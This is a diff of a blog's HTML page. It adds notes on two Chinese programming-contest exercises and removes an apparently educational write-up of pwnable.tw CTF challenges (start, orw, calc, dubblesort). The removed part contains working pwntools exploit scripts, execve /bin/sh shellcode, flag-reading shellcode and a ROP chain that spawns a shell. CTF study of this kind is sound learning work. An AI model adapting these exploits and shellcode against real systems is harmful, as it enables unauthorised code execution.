class="line">    getline(<span class="built_in">cin</span>,a);</span><br><span class="line">    getline(<span class="built_in">cin</span>,b);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; b.length() ; ++i) &#123;</span><br><span class="line">        mark[b[i]] = <span class="number">1</span>;<span class="comment">//直接将字符串的ascii码作为数组下表</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; a.length() ; ++j) &#123;</span><br><span class="line">        <span class="keyword">if</span>(mark[a[j]] == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;a[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="L1-012-计算指数"><a href="#L1-012-计算指数" class="headerlink" title="L1-012 计算指数"></a>L1-012 计算指数</h2><blockquote>
+<p>pow（底数，幂次）的结果是double型的，，，，不知道为什么不能强转到int，，，</p>
+<p>就输出是f了</p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-19.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"2^%d = %.f"</span>,n,<span class="built_in">pow</span>(<span class="number">2</span>,n));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+	
+	</div>
+  <a type="button" href="/2021/03/19/团体程序设计天梯赛-练习集/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2021/03/12/ida-flair/" >ida flair</a>
 		</h3>
 		</div>
@@ -993,351 +1106,6 @@ var _hmt = _hmt || [];
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2021/01/09/pwnable-tw记录-前八题/" >pwnable.tw记录(前八题)</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2021-01-09  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="pwnable-tw记录（前八题）"><a href="#pwnable-tw记录（前八题）" class="headerlink" title="pwnable.tw记录（前八题）"></a>pwnable.tw记录（前八题）</h1><blockquote>
-<p>更新中.jpg</p>
-<p><img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/image-20210115105118752.png" alt="image-20210115105118752"></p>
-</blockquote>
-<h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><blockquote>
-<p>栈溢出，ret2shellocde</p>
-<p>程序流程：执行一次write函数和一次read函数。</p>
-<ul>
-<li>第一次栈溢出，劫持程序返回write函数的赋参地址（接下来write会将之前的esp地址输出）</li>
-<li>第二次write输出esp地址，read函数布置栈空间，放上shellcode，并通过esp的偏移找到shellcode的地址，放在返回地址上。</li>
-</ul>
-</blockquote>
-<p><img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/20200423213641742.png" alt="20200423213641742"></p>
-<p><img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/image-20210104164903387.png" alt="image-20210104164903387"></p>
-<p>因为第一次最后面retn的时候pop eip，所以第二次write的时候，esp会在0xffffd10c也就是旧的esp的地方。</p>
-<p>第二次read的时候，因为add esp,14h，所以这里的覆盖量还是0x14</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">'./start'</span></span><br><span class="line"><span class="comment">#p = process(filename)</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,"b*0x08048060")</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Let's start the CTF:"</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x14</span>+p32(<span class="number">0x08048087</span>)</span><br><span class="line">p.send(payload)<span class="comment">#不是sendline，否则0x0a会覆盖esp地址的低地址</span></span><br><span class="line"></span><br><span class="line">esp = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">log.success(<span class="string">"esp:"</span>+hex(esp))</span><br><span class="line">shellcode_addr = esp + <span class="number">0x14</span><span class="comment">#后来的返回地址和之前的esp就差一个0x14，因为最后一个（add esp,14h）</span></span><br><span class="line">log.success(<span class="string">"shellcode_addr:"</span>+hex(shellcode_addr))</span><br><span class="line">shellcode = <span class="string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'</span><span class="comment">#32位较短的shellcode</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"b"</span>*<span class="number">0x14</span>+p32(shellcode_addr) + shellcode</span><br><span class="line">log.success(<span class="string">"len:"</span>+hex(len(payload)))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>以前写的：<a href="https://blog.csdn.net/qq_43935969/article/details/105717621" target="_blank" rel="noopener">https://blog.csdn.net/qq_43935969/article/details/105717621</a></p>
-<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><blockquote>
-<p>开启了沙箱，只能执行open、read和write函数</p>
-<p>程序流程：输入shellcode，执行shellcode，但shellcode里面只能orw</p>
-<p>找orw的shellcode即可。</p>
-<p><a href="https://xz.aliyun.com/t/6645?spm=5176.12901015.0.i12901015.5e28525cINEQJh#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/6645?spm=5176.12901015.0.i12901015.5e28525cINEQJh#toc-3</a></p>
-</blockquote>
-<p>shellcode的编写思路</p>
-<ol>
-<li><p>打开flag文件（open）</p>
-</li>
-<li><p>将文件内内容读到（read）指定位置的栈上（其实哪里东西，，，注意不会被覆盖就行）</p>
-</li>
-<li><p>用write函数读取指定位置的信息即可。</p>
-</li>
-</ol>
-<h3 id="32位函数寄存器"><a href="#32位函数寄存器" class="headerlink" title="32位函数寄存器"></a>32位函数寄存器</h3><ul>
-<li>第一个参数：ebx</li>
-<li>第二个参数：ecx</li>
-<li>第三个参数：edx</li>
-</ul>
-<h3 id="int-0x80调用表"><a href="#int-0x80调用表" class="headerlink" title="int 0x80调用表"></a>int 0x80调用表</h3><blockquote>
-<p>几个常用的，不常用的见<a href="https://blog.csdn.net/xiaominthere/article/details/17287965" target="_blank" rel="noopener">百度</a></p>
-</blockquote>
-<table>
-<thead>
-<tr>
-<th><strong>%eax</strong></th>
-<th><strong>Name</strong></th>
-<th><strong>Source</strong></th>
-<th><strong>%ebx</strong></th>
-<th><strong>%ecx</strong></th>
-<th><strong>%edx</strong></th>
-<th><strong>%esx</strong></th>
-<th><strong>%edi</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td>sys_exit</td>
-<td>kernel/exit.c</td>
-<td>int</td>
-<td>-</td>
-<td>-</td>
-<td>-</td>
-<td>-</td>
-</tr>
-<tr>
-<td>2</td>
-<td>sys_fork</td>
-<td>arch/i386/kernel/process.c</td>
-<td><a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html#pt_regs" target="_blank" rel="noopener">struct pt_regs</a></td>
-<td>-</td>
-<td>-</td>
-<td>-</td>
-<td>-</td>
-</tr>
-<tr>
-<td>3</td>
-<td>sys_read</td>
-<td>fs/read_write.c</td>
-<td>unsigned int</td>
-<td>char *</td>
-<td><a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html#size_t" target="_blank" rel="noopener">size_t</a></td>
-<td>-</td>
-<td>-</td>
-</tr>
-<tr>
-<td>4</td>
-<td>sys_write</td>
-<td>fs/read_write.c</td>
-<td>unsigned int</td>
-<td>const char *</td>
-<td><a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html#size_t" target="_blank" rel="noopener">size_t</a></td>
-<td>-</td>
-<td>-</td>
-</tr>
-<tr>
-<td>5</td>
-<td>sys_open</td>
-<td>fs/open.c</td>
-<td>const char *</td>
-<td>int</td>
-<td>int</td>
-<td>-</td>
-<td>-</td>
-</tr>
-<tr>
-<td>6</td>
-<td>sys_close</td>
-<td>fs/open.c</td>
-<td>unsigned int</td>
-<td>-</td>
-<td>-</td>
-<td></td>
-<td></td>
-</tr>
-</tbody></table>
-<h3 id="open"><a href="#open" class="headerlink" title="open"></a>open</h3><p>函数原型：<code>int open(const char * pathname, int flags, mode_t mode);</code></p>
-<p>flags表示读写权限，0表示只读</p>
-<ul>
-<li><code>O_RDONLY</code>：以只读方式打开文件。</li>
-<li><code>O_WRONLY</code>：以只写方式打开文件。</li>
-<li><code>O_RDWR</code>：以可读写方式打开文件。</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int fd = open(<span class="string">"/home/orw/flag"</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#将字符串"/home/orw/flag"放入栈中</span></span><br><span class="line">push <span class="number">0x00006761</span></span><br><span class="line">push <span class="number">0x6c662f77</span></span><br><span class="line">push <span class="number">0x726f2f65</span></span><br><span class="line">push <span class="number">0x6d6f682f</span></span><br><span class="line"></span><br><span class="line">/bin/sh</span><br><span class="line"><span class="number">0x0068732f</span></span><br><span class="line"><span class="number">0x00006873</span></span><br><span class="line"><span class="number">0x6E69622f</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov eax,0x5#open函数调用号</span><br><span class="line">mov ebx,esp#第一个参数为字符串地址，因为字符串在刚刚压栈，就是esp</span><br><span class="line">xor ecx,ecx#第二个参数为0</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/image-20210104213908883.png" alt="image-20210104213908883"></p>
-<h3 id="read"><a href="#read" class="headerlink" title="read"></a>read</h3><p>函数原型：<code>ssize_t read(int fd, void *buf, size_t count);</code></p>
-<p>fd是文件描述符</p>
-<ul>
-<li><p>标准输入（standard input）的文件描述符是 0</p>
-</li>
-<li><p>标准输出（standard output）的文件描述符是 1</p>
-</li>
-</ul>
-<p>所以这里将open函数的返回值作为文件描述符</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(fd,buf,<span class="number">0x30</span>);//直接用之前的</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov ebx,eax#fp的地址，也就是open函数返回地址</span><br><span class="line">mov ecx,esp#读入到栈上，因为后续没有push、pop等操作，所以esp不变</span><br><span class="line">mov edx,0x30#长度</span><br><span class="line">mov eax,0x3#read函数调用号</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="write"><a href="#write" class="headerlink" title="write"></a>write</h3><p>函数原型：<code>ssize_t write(int fd, const void *buf, size_t nbyte);</code></p>
-<p>标准输出，故文件描述符为1</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write(<span class="number">1</span>,buf,<span class="number">0x30</span>);</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ebx,0x1#文件描述符为1</span><br><span class="line">mov eax,0x4#write函数调用号</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
-
-<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#mobile</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">'./orw'</span></span><br><span class="line"><span class="comment">#p = process(filename)</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Give my your shellcode:"</span>)</span><br><span class="line">payload = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">push 0x00006761</span></span><br><span class="line"><span class="string">push 0x6c662f77</span></span><br><span class="line"><span class="string">push 0x726f2f65</span></span><br><span class="line"><span class="string">push 0x6d6f682f</span></span><br><span class="line"><span class="string">mov eax,0x5</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov ebx,eax</span></span><br><span class="line"><span class="string">mov ecx,esp</span></span><br><span class="line"><span class="string">mov edx,0x30</span></span><br><span class="line"><span class="string">mov eax,0x3</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov ebx,0x1</span></span><br><span class="line"><span class="string">mov eax,0x4</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="CVE-2018-1160"><a href="#CVE-2018-1160" class="headerlink" title="CVE-2018-1160"></a>CVE-2018-1160</h2><p><a href="https://xz.aliyun.com/t/3710?spm=5176.12901015.0.i12901015.1d27525cNPKLYj#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/3710?spm=5176.12901015.0.i12901015.1d27525cNPKLYj#toc-0</a></p>
-<p><a href="https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172" target="_blank" rel="noopener">https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172</a></p>
-<p><a href="https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172" target="_blank" rel="noopener">https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172</a></p>
-<h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><blockquote>
-<p>实现了一个计算器的功能，由于逻辑不严密，导致可以构造非法式子，修改内存的值。</p>
-<p>需要耐心分析程序，<del>maybe还需要脑洞大开</del></p>
-</blockquote>
-<p><img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/image-20210108173852141.png" alt="image-20210108173852141"></p>
-<p>主函数很简单，主要看calc函数</p>
-<p><img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/image-20210108174030310.png" alt="image-20210108174030310"></p>
-<p>主要有三个函数，get_expr用来输入计算公式并过滤非法字符；init_pool在站上分配一段空间并将内容清0；parse_expr是主要函数，用于对计算公式解析并计算。最后由printf函数打印输出结果。</p>
-<p>注意：函数结束的条件是<code>!get_expr((int)&amp;expr_0, 1024)</code>输入的字符串长度大于1024，然后可以返回main继续执行。</p>
-<h3 id="bzero函数"><a href="#bzero函数" class="headerlink" title="bzero函数"></a>bzero函数</h3><p>原型：extern void bzero（void *s, int n）;</p>
-<ul>
-<li>s 要置零的数据的起始地址</li>
-<li>n 要置零的数据字节个数</li>
-</ul>
-<p><img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/image-20210108174912889.png" alt="image-20210108174912889"></p>
-<p><img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/image-20210108175150201.png" alt="image-20210108175150201"></p>
-<p><img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/image-20210110211310303.png" alt="image-20210110211310303"></p>
-<p><img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/image-20210110211900726.png" alt="image-20210110211900726"></p>
-<p>这里需要好好理解。</p>
-<p>漏洞在于，</p>
-<p><img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/image-20210110212502340.png" alt="image-20210110212502340"></p>
-<p><img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/image-20210110213412358.png" alt="image-20210110213412358"></p>
-<p>最后在栈内布置如下rop</p>
-<table>
-<thead>
-<tr>
-<th>值</th>
-<th>注释</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>0x0805c34b</td>
-<td>pop eax ; ret</td>
-</tr>
-<tr>
-<td>11</td>
-<td>数值</td>
-</tr>
-<tr>
-<td>0x080701aa</td>
-<td>pop edx ; ret</td>
-</tr>
-<tr>
-<td>0</td>
-<td>数值</td>
-</tr>
-<tr>
-<td>0x080701d1</td>
-<td>pop ecx ; pop ebx ; ret</td>
-</tr>
-<tr>
-<td>0</td>
-<td>数值</td>
-</tr>
-<tr>
-<td>binsh地址</td>
-<td>通过main ebp计算得到</td>
-</tr>
-<tr>
-<td>0x08049a21</td>
-<td>int 0x80</td>
-</tr>
-<tr>
-<td>0x6E69622f</td>
-<td>“/bin”</td>
-</tr>
-<tr>
-<td>0x0068732f</td>
-<td>“/sh\x00”</td>
-</tr>
-</tbody></table>
-<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">'./calc'</span></span><br><span class="line">p = process(filename)</span><br><span class="line"><span class="comment">#p = remote("chall.pwnable.tw",10100)</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p.recvuntil(<span class="string">"==="</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"+360"</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">ebp_base = p.recv()</span><br><span class="line">ebp_base = int(ebp_base)</span><br><span class="line">print(<span class="string">"[*]ebp_base1:"</span>+str(ebp_base))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[*]ebp_base2:"</span>+hex( int(ebp_base) &amp; <span class="number">0xffffffff</span> ))</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"+361+77490"</span></span><br><span class="line">payload2 = <span class="string">"+362-77479"</span></span><br><span class="line">payload3 = <span class="string">"+363+134599427"</span></span><br><span class="line">payload4 = <span class="string">"+364-134599427"</span></span><br><span class="line">payload5 = <span class="string">"+365+77518"</span></span><br><span class="line">payload6 = <span class="string">"+366-77518"</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.sendline(payload4)</span><br><span class="line">p.sendline(payload5)</span><br><span class="line">p.sendline(payload6)</span><br><span class="line"></span><br><span class="line">bin_sh_addr=ebp_base + <span class="number">4</span></span><br><span class="line">diff_367=bin_sh_addr - <span class="number">77518</span></span><br><span class="line">p.sendline(<span class="string">'+367'</span>+str(diff_367))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'+368'</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">num_368 = p.recvline()</span><br><span class="line">diff_368 =  <span class="number">134519329</span> - int(num_368)</span><br><span class="line">print(<span class="string">"[*]diff_368:"</span>+str(diff_368))</span><br><span class="line">print(<span class="string">"[*]num_368:"</span>+str(num_368))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"+368"</span>)</span><br><span class="line">p.sendline(<span class="string">"+368+"</span>+str(diff_368))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"+369"</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">num_369 = p.recvline()</span><br><span class="line">diff_369 = <span class="number">1852400175</span> - int(num_369)</span><br><span class="line">p.sendline(<span class="string">"+369+"</span>+str(diff_369))</span><br><span class="line">print(<span class="string">"[*]num_369:"</span>+str(num_369))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"+370"</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">num_370 = p.recvline()</span><br><span class="line">print(<span class="string">"[*]num_370:"</span>+str(num_370))</span><br><span class="line">diff_370 = int(num_370) - <span class="number">6845231</span></span><br><span class="line">p.sendline(<span class="string">"+370-"</span>+str(diff_370))</span><br><span class="line">print(<span class="string">"[*]diff_370:"</span>+str(diff_370))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"a"</span>*<span class="number">2048</span>)</span><br><span class="line">p.sendline(<span class="string">"+361"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>参考：</p>
-<p><a href="https://www.freebuf.com/articles/system/189636.html" target="_blank" rel="noopener">从pwnable.tw-calc看数组越界造成的任意地址读写</a></p>
-<p>youtube上视频：<a href="https://www.youtube.com/watch?v=LTgNNE04x2w" target="_blank" rel="noopener">https://www.youtube.com/watch?v=LTgNNE04x2w</a></p>
-<h2 id="3-17"><a href="#3-17" class="headerlink" title="3* 17"></a>3* 17</h2><h2 id="dubblesort"><a href="#dubblesort" class="headerlink" title="dubblesort"></a>dubblesort</h2><blockquote>
-<p>保护全开、栈溢出</p>
-</blockquote>
-<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
-<li>输入name    =&gt;    字符串没有’\x00’截断，信息泄露，计算libc基址</li>
-<li>输入sort的数字个数    =&gt;     个数任意</li>
-<li>输入数字到arr_sort数组    =&gt;        数组在[esp+1Ch]的位置【注意：这里gdb调试的时候用ebp不好使，，，】</li>
-<li>sort进行排序    =&gt;     数据从小到大输入才不会被改变</li>
-</ol>
-<blockquote>
-<p>故如果个数较大，使得输入的数据能够覆盖返回地址和参数，即可getshell</p>
-</blockquote>
-<h4 id="1-name-libc基址"><a href="#1-name-libc基址" class="headerlink" title="1.name(libc基址)"></a>1.name(libc基址)</h4><p>令<code>name=“aaaa”</code>，查看内存，故令name为“a”×0x18，最后还要发送回车或其他覆盖泄漏地址的低字节。</p>
-<p><img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/image-20210113094525538.png" alt="image-20210113094525538"></p>
-<p><strong>这里基址的获取不等于<code>0xf7f55000 - 0xf7da2000 = 0x1B3000</code>，因为本地libc库和目标系统的libc库不一样，偏移也就不同！</strong></p>
-<h5 id="libc基址偏移的获取"><a href="#libc基址偏移的获取" class="headerlink" title="libc基址偏移的获取"></a>libc基址偏移的获取</h5><p>使用命令<code>readelf -S libc_32.so.6</code>查找<code>.got.plt</code>段的起始地址即可。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;tw$ readelf -S libc_32.so.6 </span><br><span class="line">There are 68 section headers, starting at offset 0x1b0cc8:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [...]</span><br><span class="line">  [31] .got.plt          PROGBITS        001b0000 1af000 000030 04  WA  0   0  4</span><br></pre></td></tr></table></figure>
-
-<p>也就是起始地址为<code>0x001b0000</code></p>
-<h5 id="system和”-bin-sh-x00”偏移"><a href="#system和”-bin-sh-x00”偏移" class="headerlink" title="system和”/bin/sh\x00”偏移"></a>system和”/bin/sh\x00”偏移</h5><p>system地址的获取指令：<code>readelf -s libc_32.so.6 | grep system</code>【注意：s是小写】</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;tw$ readelf -s libc_32.so.6 | grep system</span><br><span class="line">   245: 00110690    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0</span><br><span class="line">   627: 0003a940    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE</span><br><span class="line">  1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0</span><br></pre></td></tr></table></figure>
-
-<p>“/bin/sh\x00”获取：使用hex软件查找字符串”/bin/sh”</p>
-<p><img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/image-20210113101221317.png" alt="image-20210113101221317"></p>
